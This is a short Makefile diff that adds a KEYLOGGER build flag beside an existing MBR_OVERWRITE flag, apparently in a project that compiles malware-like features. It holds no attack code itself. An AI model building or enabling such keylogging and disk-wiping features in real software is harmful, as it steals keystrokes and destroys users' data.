@@ -18,6 +18,10 @@ ifeq ($(MBR_OVERWRITE),1)
 	CC_FLAGS += -DEX_MBROVERWRITE
 endif
 
+ifeq ($(KEYLOGGER),1)
+	CC_FLAGS += -DEX_KEYLOGGER
+endif
+
 ifeq ($(RELEASE),1)
 	CC_FLAGS += -O2
 else
